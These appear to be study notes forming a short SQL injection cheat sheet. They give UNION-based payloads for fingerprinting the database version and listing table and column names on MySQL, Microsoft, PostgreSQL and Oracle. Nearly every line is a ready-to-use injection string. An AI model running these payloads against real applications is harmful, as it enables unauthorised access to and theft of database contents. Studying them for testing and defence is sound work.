# details

## version

> might need some information about the database

Microsoft, MySQL -> `SELECT @@version`

Oracle -> `SELECT * FROM v$version`

PostgreSQL -> `SELECT version()`

as

`' UNION SELECT @@version --`

## dummy table

#### non oracle

`' UNION SELECT 'abc','def' --`

#### oracle

`' UNION SELECT 'abc','def' FROM dual --`

## table names of a database

#### non oracle

> getting back all the table names from the database

`' UNION SELECT table_name FROM information_schema.tables --`

> maybe the union needs to return two columns

`' UNION SELECT table_name, NULL FROM information_schema.tables --`

#### oracle

`' UNION SELECT table_name FROM all_tables --`

`' UNION SELECT table_name, NULL FROM all_tables --`

## column names of a table

#### non oracle

> on a table name that looks promising get the column names

`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='any_table_name' --`

> maybe the union needs to return two columns

`' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='any_table_name' --`

#### oracle

`' UNION SELECT column_name FROM all_tab_columns WHERE table_name='any_table_name' --`

`' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='any_table_name' --`
